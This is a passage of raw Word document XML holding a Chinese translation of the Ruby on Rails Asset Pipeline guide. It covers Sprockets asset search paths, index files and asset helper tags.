        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= stylesheet_link_tag params[:controller] %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 进行加载.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD1DE0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为了使用 CoffeeScript， 你必须有一个 </w:t>
      </w:r>
      <w:hyperlink r:id="rId960" w:anchor="readme" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ExecJS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 支持的运行时。如果你使用 Mac OS X 或者 Windows，那你的操作系统已经安装好一个 Javascript 运行时了。 查阅 </w:t>
      </w:r>
      <w:hyperlink r:id="rId961" w:anchor="readme" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ExecJS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文档了解更多支持的 JavaScript 运行时。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D40915B"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2.1 资源组织</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61153AF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Pipeline assets 可以被放置到一个应用程序中这三个位置中的一个: </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068490D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app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放置属于应用程序的资源，比如自选图像，JavaScript 文件和样式文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B46F6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lib/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于不在应用程序范围内的自有函式库，或者那些跨应用程序共通的函式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7322953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vendor/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于属于外部实体的资源，比如 JavaScript 插件和 CSS 框架的代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C32DCF"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2.1.1 搜寻路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC114F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当一个文件在资源清单或者 helper 中被指引，Sprockets 会在三个不同的资源地址去搜寻它.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4E65D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默认的位置是: </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/images</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和那三个资源地址下的所有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascripts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 子目录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A559E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例如，这三个文件:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="697C58EF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="407684E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app/assets/javascripts/home.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DD55C2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lib/assets/javascripts/moovinator.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D3DDE0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vendor/assets/javascripts/slider.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="626CBC3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会在资源清单里被指引如下:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1EF66DC8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="007D595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 home</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63D8D31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 moovinator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10260E1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 slider</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6EDE4FB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子目录下的资源同样也可以被访问。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="76894139" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61A448C9" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1589387123"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>app/assets/javascripts/sub/something.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A9831B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会像这样被指引:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3EA7D73C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BB87687" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="492725049"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>//= require sub/something</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47F8E97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你可以在 Rails console 里检阅 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.application.config.assets.paths</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，就可以看到那些搜寻路径了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332278A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附加的(完全有资格的)路径可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里被添加到 pipeline。例如:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4994180C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C7BEF31" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="284508481"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.paths &lt;&lt; Rails.root.join("app", "assets", "flash")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="516B57C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路径会按找在搜寻路径中出现的顺序被历遍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E12675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有一点非常重要要注意的是，你想在资源清单外引用的文件必须加载到预编译列表里，否则它们在生产环境将不可以用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43129752"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2.1.2 使用索引文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B43F92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Sprockets 对一些特殊的用途会使用名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (使用相关扩展) 的文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39BA619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例如，如果你的许多模块都要使用某个 jQuery 函式库，这个函式库存放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/assets/library_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/assets/library_name/index.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会作为这个库的所有文件的 manifest. 这个文件可以按顺序包含一组需要使用的文件，或者一个简单的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_tree</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3F244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这个函式库可以作为一个整体被网站应用程序的资源清单像这样访问：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="370C8D34" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="175F1DF2" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1686322314"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>//= require library_name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7791D7E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通过让相关的代码在被其它地方引用之前组织起来，简化了组织结构而且保持事务清晰。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3113EAB2"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2.2 连接资源的代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641F703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Sprockets 不添加任何新方法去访问你的资源 – 你依旧使用熟悉的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4F2D2C6C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2521387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stylesheet_link_tag "application"</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067EF29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javascript_include_tag "application"</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130E137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在一般的视图里，你可以这样访问 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assets/images</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下的图片：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0291FACE" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E0D62BF" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1785345488"/>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image_tag "rails.png"</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354F53E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这在你的应用程序使用了 pipeline (并且在当前的环境上下文中没有被关闭)时才会提供，这些文件通过 Sprockets 获得。 如果文件位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/assets/rails.png</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 那么它将通过 web 服务器获得。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F529F0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另一种情况是，请求一个带有 MD5 哈希值的文件如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/assets/rails-af27b6a414e6da00003503148be9b409.png</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会被同样对待。 在本指南后续的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId962" w:anchor="in-production" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
